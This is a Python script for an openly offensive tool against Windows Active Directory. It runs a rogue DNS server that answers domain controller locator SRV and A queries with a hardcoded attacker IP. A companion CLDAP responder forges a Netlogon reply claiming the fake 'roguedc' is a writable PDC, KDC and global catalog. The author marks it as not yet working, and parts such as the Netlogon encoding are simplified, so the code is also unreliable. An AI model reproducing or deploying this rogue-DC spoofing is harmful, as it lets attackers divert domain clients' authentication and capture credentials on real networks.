import socket, threading, re, sys
from dnslib import RR, QTYPE, SRV, A
from dnslib.server import DNSServer, BaseResolver

# ----------------------------
# DOES NOT WORK. (Yet)
# ----------------------------


ROGUE_IP        = "192.168.1.201"     
DC_HOST_LABEL   = "roguedc"           
DEFAULT_SITE    = "Default-First-Site-Name"

# ----------------------------
# Shared state
# ----------------------------
class SharedConfig:
    def __init__(self):
        self.lock = threading.Lock()
        self.domain_dns = None            
        self.forest_dns = None            
        self.domain_netbios = None        
        self.site_name = DEFAULT_SITE

    def update_from_domain(self, domain_dns: str):
        with self.lock:
            if not self.domain_dns:
                self.domain_dns    = domain_dns
                self.forest_dns    = self.forest_dns or domain_dns
                self.domain_netbios= self.domain_netbios or domain_dns.split(".")[0].upper()
                print(f"[CFG] domain={self.domain_dns} forest={self.forest_dns} netbios={self.domain_netbios}")

    def update_site(self, site: str):
        with self.lock:
            self.site_name = site
            print(f"[CFG] site={self.site_name}")

    def snap(self):
        with self.lock:
            d_dns = self.domain_dns
            return dict(
                rogue_ip      = ROGUE_IP,
                dc_host_label = DC_HOST_LABEL,
                domain_dns    = d_dns,
                forest_dns    = self.forest_dns or d_dns,
                domain_netbios= self.domain_netbios or (d_dns.split(".")[0].upper() if d_dns else "WORKGROUP"),
                site_name     = self.site_name,
            )

CFG = SharedConfig()

# ----------------------------
# DNS parsing helpers
# ----------------------------
SITE_MSDSC_RE = re.compile(r"""^_(ldap|kerberos)\._tcp\.(?P<site>[^.]+)\._sites\.dc\._msdcs\.(?P<domain>[^.].+?)\.$""", re.I)
DC_MSDSC_RE   = re.compile(r"""^_(ldap|kerberos)\._tcp\.dc\._msdcs\.(?P<domain>[^.].+?)\.$""", re.I)
PDC_MSDSC_RE  = re.compile(r"""^_(ldap|kerberos)\._tcp\.pdc\._msdcs\.(?P<domain>[^.].+?)\.$""", re.I)  # <-- NEW
GUID_MSDSC_RE = re.compile(r"""^_(ldap|kerberos)\._tcp\.[0-9a-f-]+\.domains\._msdcs\.(?P<domain>[^.].+?)\.$""", re.I)
PLAIN_AD_RE   = re.compile(r"""^_(ldap|kerberos)\._tcp\.(?P<domain>[^.].+?)\.$""", re.I)

def parse_locator_name(qname: str):
    s = qname.strip().lower()
    if not s.endswith("."): s += "."
    m = SITE_MSDSC_RE.match(s)
    if m: return m.group(1), m.group("domain"), m.group("site")
    m = DC_MSDSC_RE.match(s)
    if m: return m.group(1), m.group("domain"), None
    m = PDC_MSDSC_RE.match(s)            # handle PDC queries correctly
    if m: return m.group(1), m.group("domain"), None
    m = GUID_MSDSC_RE.match(s)
    if m: return m.group(1), m.group("domain"), None
    m = PLAIN_AD_RE.match(s)
    if m: return m.group(1), m.group("domain"), None
    return None, None, None

# ----------------------------
# Rogue DNS
# ----------------------------
class RogueResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        reply = request.reply()
        print(f"[DNS] Query {qname} ({qtype})")

        # LDAP/Kerberos SRV → point to roguedc.<domain>. (NOT under _msdcs)
        if qtype == "SRV":
            svc, domain, site = parse_locator_name(qname)
            if svc in ("ldap", "kerberos") and domain:
                CFG.update_from_domain(domain)
                if site:
                    CFG.update_site(site)

                snap = CFG.snap()
                dc_fqdn = f"{snap['dc_host_label']}.{domain}."
                port = 389 if svc == "ldap" else 88

                print(f"[DNS] SRV -> {dc_fqdn}:{port}")
                reply.add_answer(RR(
                    rname=request.q.qname,
                    rtype=QTYPE.SRV,
                    rdata=SRV(priority=0, weight=0, port=port, target=dc_fqdn),
                    ttl=60
                ))
                reply.add_ar(RR(  # glue A
                    rname=dc_fqdn,
                    rtype=QTYPE.A,
                    rdata=A(snap["rogue_ip"]),
                    ttl=60
                ))
                return reply

        # A for our fake DC name
        if qtype == "A":
            snap = CFG.snap()
            if snap["domain_dns"]:
                dc_fqdn = f"{snap['dc_host_label']}.{snap['domain_dns']}."
                if qname.lower() == dc_fqdn.lower():
                    print(f"[DNS] A -> {snap['rogue_ip']} for {dc_fqdn}")
                    reply.add_answer(RR(
                        rname=request.q.qname,
                        rtype=QTYPE.A,
                        rdata=A(snap["rogue_ip"]),
                        ttl=60
                    ))

        return reply

# ----------------------------
# CLDAP (UDP/389) responder
# ----------------------------
def u8(x):  return x.to_bytes(1, "little", signed=False)
def u16(x): return x.to_bytes(2, "little", signed=False)
def u32(x): return x.to_bytes(4, "little", signed=False)
def uni(s): return s.encode("utf-16le")

def ndr_counted_unicode(s: str):
    b = uni(s)
    chars = len(b)//2
    return u16(chars) + u16(chars) + b  # simplified counted UNICODE

def build_netlogon_ex_blob():
    snap   = CFG.snap()
    dc_nb  = snap["dc_host_label"].upper()                                # e.g., ROGUEDC
    dc_dns = f"{snap['dc_host_label']}.{snap['domain_dns']}" if snap["domain_dns"] else snap["dc_host_label"]
    dom_nb = snap["domain_netbios"]
    dom_dn = snap["domain_dns"] or "local"
    frs_dn = snap["forest_dns"] or dom_dn
    site   = snap["site_name"]

    # UNC-styled names (Windows typically expects \\NAME and \\fqdn)
    dc_name_unc    = f"\\\\{dc_nb}"
    dc_address_unc = f"\\\\{dc_dns}"

    # Common “works everywhere” flags incl. PDC, LDAP, KDC, DS, time, writable
    flags = (
        0x00000001 |  # DS_PDC_FLAG
        0x00000002 |  # DS_GC_FLAG
        0x00000004 |  # DS_LDAP_FLAG
        0x00000010 |  # DS_DS_FLAG
        0x00000020 |  # DS_KDC_FLAG
        0x00000100 |  # DS_TIMESERV_FLAG
        0x00002000 |  # DS_WRITABLE_FLAG
        0x00008000    # DS_GOOD_TIMESERV_FLAG
    )

    blob  = b""
    blob += ndr_counted_unicode(dc_name_unc)     # DomainControllerName (\\ROGUEDC)
    blob += ndr_counted_unicode(dc_address_unc)  # DomainControllerAddress (\\roguedc.testlab.local)
    blob += u32(2)                               # AddressType = 2 (DS_ADDRESS_TYPE_INET)
    blob += ndr_counted_unicode(dom_nb)          # DomainName (NetBIOS)
    blob += ndr_counted_unicode(dom_dn)          # DnsDomainName
    blob += ndr_counted_unicode(frs_dn)          # DnsForestName
    blob += u32(flags)                           # Flags
    blob += ndr_counted_unicode(site)            # DcSiteName
    blob += ndr_counted_unicode(site)            # ClientSiteName
    return blob

# Tiny BER helpers for LDAP wrapper
def ber_len(n: int):
    if n < 0x80: return u8(n)
    b = n.to_bytes((n.bit_length()+7)//8, "big")
    return u8(0x80 | len(b)) + b

def ber_octet_string(b: bytes): return b"\x04" + ber_len(len(b)) + b
def ber_sequence(b: bytes):     return b"\x30" + ber_len(len(b)) + b
def ber_enumerated(i: int):     return b"\x0a\x01" + u8(i)
def ber_integer(i: int):
    if i == 0: return b"\x02\x01\x00"
    b = i.to_bytes((i.bit_length()+7)//8, "big")
    if b[0] & 0x80: b = b"\x00" + b
    return b"\x02" + ber_len(len(b)) + b

def build_cldap_response():
    netlogon = build_netlogon_ex_blob()

    # Attribute netlogon: OCTET STRING <blob>
    attr_type  = ber_octet_string(b"netlogon")
    attr_vals  = b"\x31" + ber_len(len(ber_octet_string(netlogon))) + ber_octet_string(netlogon)
    partial_attribute = ber_sequence(attr_type + attr_vals)
    attributes = b"\x30" + ber_len(len(partial_attribute)) + partial_attribute

    # SearchResultEntry [APPLICATION 4]
    sre = b"\x64" + ber_len(len(ber_octet_string(b"") + attributes)) + ber_octet_string(b"") + attributes
    # SearchResultDone [APPLICATION 5] success(0)
    srd = b"\x65" + ber_len(len(ber_enumerated(0) + ber_octet_string(b"") + ber_octet_string(b""))) \
        + ber_enumerated(0) + ber_octet_string(b"") + ber_octet_string(b"")

    # Two LDAPMessages with messageID=1
    msg1 = ber_sequence(ber_integer(1) + sre)
    msg2 = ber_sequence(ber_integer(1) + srd)
    return msg1 + msg2

def cldap_server(bind_ip="0.0.0.0", port=389):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_ip, port))
    print(f"[*] CLDAP rogue listening on {bind_ip}:{port}")
    while True:
        data, addr = sock.recvfrom(4096)
        if not data or data[0] != 0x30:  # quick “is this LDAP-ish?” check
            continue
        print(f"[CLDAP] query from {addr}, len={len(data)}")
        resp = build_cldap_response()
        sock.sendto(resp, addr)
        print(f"[CLDAP] sent Netlogon response to {addr}")

# ----------------------------
# Bootstrap both services
# ----------------------------
def main():
    # Start CLDAP
    t = threading.Thread(target=cldap_server, kwargs={"bind_ip": "0.0.0.0", "port": 389}, daemon=True)
    t.start()

    # Start DNS (UDP only is enough for locator)
    resolver = RogueResolver()
    dns_srv = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    print("[*] Rogue DNS server running on UDP/53 ...")
    dns_srv.start()  # blocks

if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print("[-] Permission denied. Run as Administrator/root (ports 53/389).", file=sys.stderr)
        sys.exit(1)
